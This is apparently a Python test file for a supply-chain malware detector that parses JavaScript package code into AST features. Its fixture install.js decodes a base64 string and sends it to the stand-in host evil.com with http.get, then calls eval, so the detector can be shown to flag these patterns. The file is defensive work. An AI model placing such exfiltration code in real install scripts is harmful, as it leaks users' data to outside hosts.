"""Tests for supplyguard.parsing.ast_extractor."""

import tempfile
from pathlib import Path

from supplyguard.parsing.ast_extractor import (
    FEATURE_DIM,
    NODE_TYPE_CATEGORIES,
    extract_ast,
    get_node_features,
)

JS_CODE = """\
const http = require("http");
const encoded = Buffer.from("aGVsbG8gd29ybGQ=", "base64");
const decoded = encoded.toString();
const url = "http://evil.com/?data=" + decoded;
http.get(url);
eval("console.log('test')");
"""

# Feature-index constants for readability. The parser owns the full width.
_TYPE_FEATURES = len(NODE_TYPE_CATEGORIES) + 1
_IDX_IS_EVAL_CALL = _TYPE_FEATURES
_IDX_IS_BASE64 = _TYPE_FEATURES + 4
_IDX_IS_DANGEROUS = _TYPE_FEATURES + 7
_EXPECTED_VEC_LEN = FEATURE_DIM


def _make_package(tmp: Path) -> Path:
    js_file = tmp / "install.js"
    js_file.write_text(JS_CODE, encoding="utf-8")
    return tmp


def test_extract_ast_nodes_and_edges():
    with tempfile.TemporaryDirectory() as tmpdir:
        pkg = _make_package(Path(tmpdir))
        nodes, edges = extract_ast(str(pkg))

        assert len(nodes) > 0, "nodes list must not be empty"
        assert len(edges) > 0, "edges list must not be empty"

        for edge in edges:
            assert edge["edge_type"] == "ast_child", (
                f"unexpected edge_type: {edge['edge_type']}"
            )


def test_dangerous_import_require_http():
    with tempfile.TemporaryDirectory() as tmpdir:
        pkg = _make_package(Path(tmpdir))
        nodes, _ = extract_ast(str(pkg))

        require_nodes = [
            n for n in nodes
            if n["type"] == "call_expression" and 'require("http")' in n["text"]
        ]
        assert require_nodes, "should find require('http') call_expression node"

        feats = get_node_features(require_nodes[0])
        assert len(feats) == _EXPECTED_VEC_LEN
        assert feats[_IDX_IS_DANGEROUS] == 1.0, (
            "is_dangerous_import should be 1.0 for require('http')"
        )


def test_base64_indicator():
    with tempfile.TemporaryDirectory() as tmpdir:
        pkg = _make_package(Path(tmpdir))
        nodes, _ = extract_ast(str(pkg))

        b64_nodes = [n for n in nodes if "base64" in n["text"]]
        assert b64_nodes, "should find at least one node containing 'base64'"

        feats = get_node_features(b64_nodes[0])
        assert feats[_IDX_IS_BASE64] == 1.0, (
            "is_base64_indicator should be 1.0 for node containing 'base64'"
        )


def test_eval_call():
    with tempfile.TemporaryDirectory() as tmpdir:
        pkg = _make_package(Path(tmpdir))
        nodes, _ = extract_ast(str(pkg))

        eval_nodes = [
            n for n in nodes
            if n["type"] == "call_expression" and "eval(" in n["text"]
        ]
        assert eval_nodes, "should find eval() call_expression node"

        feats = get_node_features(eval_nodes[0])
        assert feats[_IDX_IS_EVAL_CALL] == 1.0, (
            "is_eval_call should be 1.0 for eval()"
        )


def test_feature_vector_length():
    with tempfile.TemporaryDirectory() as tmpdir:
        pkg = _make_package(Path(tmpdir))
        nodes, _ = extract_ast(str(pkg))

        for node in nodes:
            feats = get_node_features(node)
            assert len(feats) == _EXPECTED_VEC_LEN, (
                f"expected {_EXPECTED_VEC_LEN} features, got {len(feats)}"
            )


def test_print_summary():
    """Not a real assertion — prints inspection data (run with ``pytest -s``)."""
    with tempfile.TemporaryDirectory() as tmpdir:
        pkg = _make_package(Path(tmpdir))
        nodes, edges = extract_ast(str(pkg))

        print(f"\n{'='*60}")
        print(f"Total nodes : {len(nodes)}")
        print(f"Total edges : {len(edges)}")

        require_nodes = [
            n for n in nodes
            if n["type"] == "call_expression" and 'require("http")' in n["text"]
        ]
        b64_nodes = [n for n in nodes if "base64" in n["text"] and n["type"] == "string"]
        eval_nodes = [
            n for n in nodes
            if n["type"] == "call_expression" and "eval(" in n["text"]
        ]

        examples = []
        if require_nodes:
            examples.append(("require('http')", require_nodes[0]))
        if b64_nodes:
            examples.append(("base64 string", b64_nodes[0]))
        if eval_nodes:
            examples.append(("eval() call", eval_nodes[0]))

        flag_names = [
            "is_eval_call", "is_exec_call", "is_network_call", "is_file_op",
            "is_base64_indicator", "is_obfuscated", "is_env_access",
            "is_dangerous_import",
        ]

        print(f"\n--- 3 example nodes ---")
        for label, node in examples:
            feats = get_node_features(node)
            flags = feats[len(NODE_TYPE_CATEGORIES) + 1 :]
            active = [
                name for name, val in zip(flag_names, flags) if val == 1.0
            ]
            print(
                f"\n  [{label}]  id={node['id']}  type={node['type']}"
                f"  lines {node['start_line']}-{node['end_line']}"
            )
            print(f"  text = {node['text']!r}")
            print(f"  active flags = {active or '(none)'}")
            print(f"  full vector  = {feats}")
        print("=" * 60)
